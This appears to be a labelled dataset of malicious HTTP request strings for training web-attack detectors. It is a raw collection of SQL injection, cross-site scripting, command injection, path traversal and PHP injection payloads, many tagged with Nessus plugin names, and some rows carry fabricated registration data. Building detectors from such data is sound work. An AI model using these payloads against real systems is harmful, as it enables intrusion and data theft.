sentences 	 labels
/ string & str =  $  ( echo spzwvr )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ string & strings & parameters = print (  ` echo okejjb echo  $  (  ( 46 + 60 )  )  echo okejjb echo okejjb `  )  ; okejjb  	 1
/ string & strings & parameters = 1 )  where 7815 = 7815 union all select null , null , null , null , null , null , null #  	 1
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  { file }  	 1
/ string & strings & parameters = "  & echo $ ifsocygaq $  (  ( 67 + 93 )  )  $  ( echo $ ifsocygaq ) ocygaq |  	 1
/ string & strings & parameters = 1 "  "  union all select null #  	 1
/ string & modo = entrar & login = levon & pwd = caucela & remember = off &  & b1 = entrar  	 1
/ string & strings & parameters = |  | echo heyzba $  (  ( 8 + 23 )  )  $  ( echo heyzba ) heyzba '  	 1
/ string & id = 2 & nombre = any ?  set-cookie :  + tamper = 5765205567234876235 & precio = 39 & cantidad = 75 & b1 = aadir + al + carrito  	 1
/ string & errormsg = credenciales + incorrectas '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 1
/ string & strings & parameters = 1 '  |  |  ( select  ' lzvb '  where 1637 = 1637 union all select null , null , null , null , null , null , null , null #  	 1
/ search & index . cfm ?  < script > alert (  \  " vulnerable \  "  )  <  / script >  	 1
/ zmvq66jy . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & id = 1 & nombre = vino +  .  *  ? rioja & precio = 39 & cantidad = 56 & b1 = aadir + al + carrito  	 1
/ controllers & viewcontroller . php ? basedir = xxpathxx  	 1
/ string & strings & parameters = 1 "  "  )  )  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  "  " eoab "  "  like  "  " eoab  	 1
/ string & strings & parameters = 1 '  )  where 6274 = 6274 or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 1
/ string & strings & parameters = -1 < body background =  "  " javascript : document . cookie = true ;  "  "  >  	 1
/ string & modo = registro & login = gi &  ? l & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar  	 1
/ string & strings & parameters = & echo jygqcn $  (  ( 44 + 48 )  )  $  ( echo jygqcn ) jygqcn \  	 1
/ string & strings & parameters = < form formaction = popup = 1 ;  onclick = popup = 1 ;  >  < object >  	 1
/ string & strings & parameters = "  ;  str =  $  ( echo uyjmim )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  &  	 1
/ vhzmaia2 . asp ?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >  	 1
/ help . php ? q =  "  \ x0duname  > q43695626  #? q =  "  \ x0duname  > q43695626  #  	 1
/ string & strings & parameters = 1 '  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  ' pfal '  =  ' pfal  	 1
/ string & strings & parameters = "  ;  str =  $  ( echo zwbbrm )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 1
/ string & str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ examples & jsp & cal & protection . php ? action = logout & siteurl =  / etc / passwd  	 1
/ main . php ? stuff =  " rm \ x09q84368944 \ x09 #? stuff =  " rm \ x09q84368944 \ x09 #  	 1
/ string & strings & parameters = &  # 00 ;  <  & form >  < input type &  # 61 ;  " date "  onfocus =  " alert ( 1 )  "  >  	 1
/ yver8r9o . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = "  & echo $ ifsqovijm $  (  ( 98 + 90 )  )  $  ( echo $ ifsqovijm ) qovijm &  &  	 1
/ string & strings & parameters = 1 "  "  )  )  as jsdc where 2748 = 2748 ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  &  ( select 0 from dual )  end )  from dual --  	 1
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919142 & lang_crm =  .  .  ? module = vtiger_lang_crm_lfi . nasl & action = 1331919142 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / boot . ini \ x00  	 1
/ ao22ww7y . exe ?  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >?  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  	 1
/ string & strings & parameters = &  # 00 ;  <  & form >  < input type &  # 61 ;  " date "  onfocus =  " confirm ( 1 )  "  >  	 1
/ main . php ? stuff =  "  ; del q85142671  #? stuff =  "  ; del q85142671  #  	 1
/ javascript & dumps . exe  	 1
/ webdav & c99 . php ? act = f & f = xampp_stop . exe & d = c :  \ xampp &  	 1
/ top . php ? stuff =  "  & ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0? stuff =  "  & ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  	 1
/ string & strings & parameters = 1 "  "  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  "  " dppw "  "  like  "  " dppw  	 1
/ string & strings & parameters = -2284 %  "  "  )  )  or 9323 = 9323 #  	 1
/ p043snfr . mscgi ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ javascript & my . exe  	 1
/ string & strings & parameters = -3505 "  "  )  or 5290 = 3436 --  	 1
/ o6ebbirj . x ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ global . php ? abs_path = xxpathxx ?? abs_path = xxpathxx ?  	 1
/ recordings & popup . php ? include_path =  / etc / passwd \ x00  	 1
/ string & strings & parameters = -9156 '  )  )  union all select 9110 , 9110 , 9110 , 9110 #  	 1
/ examples & servlets & servlet & awstatstotals . php ? sort =  {  $  { phpinfo (  )  }  }  {  $  { exit (  )  }  }  	 1
/ string & strings & parameters = 1 '  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  ' nopu '  =  ' nopu  	 1
/ string & modo = registro & login = winny & password = centillero & nombre = zoa & apellidos = antonioli + blanc & email = gonard . guercio @ cincocolores . va & dni = 25815583s & direccion = fincas + adjuntas + 15 +  & ciudad = canal + de + berdn & cp = 4913a & provincia = la + rioja & ntc = 6959722794885758 & b1 = registrar  	 1
/ string & strings & parameters = < div style =  " width :  expression ( confirm ( 5 )  )  ;  "  >  	 1
/ string & strings & parameters = '  . print (  ` echo pfjgqm echo  $  (  ( 86 + 33 )  )  echo pfjgqm echo pfjgqm `  )  ;  )  } pfjgqm  	 1
/ string & strings & parameters = &  & echo $ ifsrirrvg $  (  ( 43 + 47 )  )  $  ( echo $ ifsrirrvg ) rirrvg  	 1
/ top . php ? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 | rem \ xa0? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 | rem \ xa0  	 1
/ j734qobz . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & modo = insertar |  & precio = 7602 & b1 = confirmar  	 1
/ string & strings & parameters = )  ;  } print (  ` echo oskstf echo  $  (  ( 2 + 12 )  )  echo oskstf echo oskstf `  )  ;  .  ' oskstf  	 1
/ top . php ? stuff =  "  \ x0auname  > q15138829  #? stuff =  "  \ x0auname  > q15138829  #  	 1
/ string & strings & parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  &  	 1
/ ywaxntrx . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ o1zj4u9v . php ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  	 1
/  .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 { file }  	 1
/ string & strings & parameters = < img + lowsrc =  " javascript : alert ( 1 )  ;  "  >  	 1
/ string & strings & parameters = '  ; echo drgcti $  (  ( 40 + 71 )  )  $  ( echo drgcti ) drgcti &  &  	 1
/ examples & jsp & sessions & athenareg . php ? pass =   ; id  	 1
/ string & id = 3 &  & nombre = queso + manchego & precio = 39 & cantidad = 45 & b1 = aadir + al + carrito  	 1
/ scripts & webmail . exe  	 1
/ manager & session & login . php ? dest = nessus "  >  < script > alert (  ' ossim_dest_xss . nasl '  )  <  / script >  <  !  --  	 1
/ removal_tool . exe &  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo pdoptj )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  &  &  	 1
/ igtf0zon . exe ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ nsn &  .  .  \ util & copy . bas  	 1
/ examples & jsp & cal & directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = -9484 '  or  ( 7129 = 2349 )  * 2349 and  ' fcsa '  like  ' fcsa  	 1
/ examples & jsp & num & index . php ? _language =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = | echo phlzmc $  (  ( 98 + 93 )  )  $  ( echo phlzmc ) phlzmc \  	 1
/ help . php ? q =  " rm \ xa0q88986355 & rem \ xa0? q =  " rm \ xa0q88986355 & rem \ xa0  	 1
/ admin & components & com_fm & fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1331904435  	 1
/ string & strings & parameters = |   [  1 -ne  $  ( echo ftwokg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ cgi-bin & search . jsp ? q =  %  "  < script > alert ( 1332008604 )  <  / script >  	 1
/ phpmyadmin &  ?  "  >  < script > alert (  ' struts_sa_surl_xss . nasl '  )  <  / script >  	 1
/ string & strings & parameters = 1 where 8905 = 8905 and make_set ( 7654 = 1923 , 1923 )  --  	 1
/ string & strings & parameters = 1 %  "  "  )  union all select null , null , null , null , null , null , null , null , null --  	 1
/ uvazfs7p . x ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  	 1
/ 6qbynt4f . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = echo urbcmk $  (  ( 17 + 54 )  )  $  ( echo urbcmk ) urbcmk '  	 1
/ scripts & index . php ? act = sm_window & page = event & day = -1 union select 1 , 1331905207 , 2042987140  --  	 1
/ r3le3om5 . pl ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ scripts & callboth . php ? seq = 654321 & out = 123456 & in = 1331908862 @ nessus \ x0d \ x0aasteridex_in_code_injection . nasl  	 1
/ examples & jsp & cal & perl . exe ? -v  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo bodwqd )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  &  &  	 1
/ string & modo = registro & login = liping & password = paletada & nombre = laura & apellidos = esparraguera & email = palk @ interpretacion-diccionario-y-significado-de-los-sueos . com .  & dni = b93390897h & direccion = calle + gonzalo + de + berceo + 76 ,  +  & ciudad = rioseco + de + soria & cp = 16890 & provincia = salamanca & ntc = 5041701632668504 & b1 = registrar  	 1
/ dda2qr7j . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = 10 + union + select + load_file ( 0x2f6574632f706173737764 )  	 1
/ string & strings & parameters = 1 )  where 2678 = 2678 union all select null , null , null , null , null , null , null , null , null #  	 1
/ bzuf9ozq . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = &  & echo zepmbc $  (  ( 82 + 3 )  )  $  ( echo zepmbc ) zepmbc &  	 1
/ examples & jsp & checkbox & gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = -2168 "  "  )  )  union all select 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 --  	 1
/ string & strings & parameters = 1 '  +  ( select  ' xqjx '  where 7048 = 7048 and 9198 = 9198 --  	 1
/ string & modo = registro & login = anurag & password = am60a4i7o & nombre = custodio & apellidos = amazarray + gersol & email = martell @ 923 . pe & dni = 15138092k & direccion = sant + josep ,  + 93 ,  +  & ciudad = castellar + del + valls & cp = 03813 & provincia = soria "  >  <  !  --  # exec + cmd =  " dir +  "  --  >  <  & ntc = 2906865498291139 & b1 = registrar  	 1
/ string & strings & parameters = 1 '  where 2183 = 2183 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 &  ( select 0 )  end )  --  	 1
/ string & modo = registro & login = paros "  style =  " background : url ( javascript : alert (  ' paros '  )  )  & password = alarm ? ista & nombre = zelina & apellidos = morcillo + amparan & email = colona @ aebo . lb & dni = 86164975y & direccion = alamo ,  + s / n ,  +  & ciudad = casas + de + reina & cp = 05413 & provincia = salamanca & ntc = 0630515936517830 & b1 = registrar  	 1
/ string & strings & parameters = 1 %  '  )  union all select null , null , null , null , null , null , null #  	 1
/ 9kr0ih0v . do ?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >  	 1
/ string & strings & parameters = 1 )  where 7199 = 7199 and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 1
/ string & strings & parameters = '  | echo $ ifsfrpqgh $  (  ( 5 + 72 )  )  $  ( echo $ ifsfrpqgh ) frpqgh  	 1
/ string & strings & parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null )   --  	 1
/ string & strings & parameters = 1 "  "  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  	 1
/ string & strings & parameters = |   [  6 -ne  $  ( echo dlkwgt  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ main . php ? logout =  & ver \ x0b > q39725894 & rem \ x0b? logout =  & ver \ x0b > q39725894 & rem \ x0b  	 1
/ string & strings & parameters = < form >  < button formaction =  " javascript : alert ( 1 )  "  > x <  & button >  	 1
/ uc3w3bdi . kspx ?  < script > document . cookie =  " testxllt = 9940 ;  "  <  ?  < script > document . cookie =  " testxllt = 9940 ;  "  <  / script >  	 1
/ string & modo = registro & login = polk & password = d8fide10i3 & nombre = norcelo & apellidos = payseo + el_gueta & email = cummings @ muebetuweb . lr & dni = 85128607h & direccion = calle + floridablanca ,  + 114 ,  + 7b & ciudad = linares + de + riofro & cp = 07127 & provincia = zaragoza & ntc = 3967507613982177 & b1 = registrar  	 1
/ string & strings & parameters = '  ;  str =  $  ( echo hldnyh )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 1
/ top . php ? stuff =  '  ; uname \ x09 > q48683432 \ x09 #? stuff =  '  ; uname \ x09 > q48683432 \ x09 #  	 1
/ phpmyadmin & secure . php ? cfgprogdir =  / etc / passwd \ x00  	 1
/ main . php ? logout =  " ver \ xa0 > q51679818 & rem \ xa0? logout =  " ver \ xa0 > q51679818 & rem \ xa0  	 1
/ string & str =  $  ( echo jadkkf )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/ string & strings & parameters = \ x3cscript > javascript : alert ( 1 )  <  & script >  	 1
/ string & modo = registro & login = bustillo & password = des6ra50ce3 & nombre = juana + del + pilar & apellidos = soria + lloren & email = tushingham @ saavedradiaz . hu & dni = 05392148m & direccion = carrer + auro + s & n ,  + 1 ? h & ciudad = zugarramurdi & cp = 10130 & provincia = lleida & ntc = 250050684012121 & b1 = registrar  	 1
/ string & strings & parameters = 1 '  )  rlike  ( select  ( case when  ( 7447 = 3981 )  then 1 else 0x28 end )  )  	 1
/ string & strings & parameters = 1 )  )  as ewlg where 3722 = 3722 rlike sleep ( 5 )  --  	 1
/ l752x1ry . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ examples & servlets & servlet & directory . php ? dir =  ; cat  / etc / passwd  	 1
/ string & strings & parameters = &  & echo $ ifsdkxdpb $  (  ( 45 + 44 )  )  $  ( echo $ ifsdkxdpb ) dkxdpb \  	 1
/ string & strings & parameters = 1 '  )  procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  and  (  ' szib '  like  ' szib  	 1
/ string & strings & parameters = < svg onload = document . writeln ( decodeuri ( location . hash )  )  >  #  < img src = onerror = alert ( 1 )  >  	 1
/ string & modo = entrar & login = rizzardi & pwd =  , 9 & oc7c4 , 0 & remember = on & b1 = entrar  	 1
/ phpmyadmin & documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00index . html  	 1
/ manager & mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  	 1
/ query . idq ? citemplate =  .  .  ? citemplate =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  	 1
/ help . php ? q =  ' sleep 11  #? q =  ' sleep 11  #  	 1
/ string & strings & parameters = 1 )  )  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 1
/ string & strings & parameters = echo $ ifsuhekzf $  (  ( 6 + 76 )  )  $  ( echo $ ifsuhekzf ) uhekzf &  	 1
/ cgi-bin & dataservice . asmx & authuser ? username =  ' nessus1331919210 & password = nasl & needcompress = 0  	 1
/ moodle & filter & tex & texed . php ? formdata = foo & pathname = foo "  +  |  |  + del + esbq  	 1
